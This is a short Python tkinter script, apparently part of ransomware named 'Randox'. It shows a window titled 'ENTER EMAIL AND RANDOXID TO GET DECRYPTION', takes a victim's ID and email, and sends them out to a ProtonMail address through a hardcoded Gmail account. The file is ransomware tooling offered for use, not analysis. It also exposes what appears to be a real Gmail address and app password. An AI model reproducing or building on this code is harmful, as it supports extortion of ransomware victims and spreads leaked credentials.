# Program to make a simple
# login screen


import tkinter as tk

root = tk.Tk()

# setting the windows size
root.geometry("600x400")
root.title("ENTER EMAIL AND RANDOXID TO GET DECRYPTION")

# declaring string variable
# for storing name and password
name_var = tk.StringVar()
id_var = tk.StringVar()


# defining a function that will
# get the name and password and
# print them on the screen
def submit():
    name = name_var.get()
    name1 = id_var.get()

    print("The name is : " + name)
    print("The password is : " + name1)

    name_var.set("")
    id_var.set("")
    from redmail import gmail
    gmail.username = 'dwepay.india@gmail.com'  # Your Gmail address
    gmail.password = 'pllbckjjqnnifktz'

    # And then you can send emails
    gmail.send(
        subject="DWE | RANDOXER AFFECTED : " + str(name1) + " : ",
        receivers=["dwecloud@protonmail.com"],
        text=("RANDOX ID : "+str(name)+"""
        EMAIL ID : """+str(name1)))
    root.destroy()


# creating a label for
# name using widget Label
name_label = tk.Label(root, text='RANDOX ID : ', font=('calibre', 10, 'bold'))

# creating a entry for input
# name using widget Entry
name_entry = tk.Entry(root, textvariable=name_var, font=('calibre', 10, 'normal'))

# creating a label for password
id_label = tk.Label(root, text='Email ID : ', font=('calibre', 10, 'bold'))

# creating a entry for password
id_entry = tk.Entry(root, textvariable=id_var, font=('calibre', 10, 'normal'))

# creating a button using the widget
# Button that will call the submit function
sub_btn = tk.Button(root, text='Submit', command=submit)

# placing the label and entry in
# the required position using grid
# method
name_label.grid(row=0, column=0)
name_entry.grid(row=0, column=1)
id_label.grid(row=1, column=0)
id_entry.grid(row=1, column=1)
sub_btn.grid(row=2, column=1)

# performing an infinite loop
# for the window to display
root.mainloop()
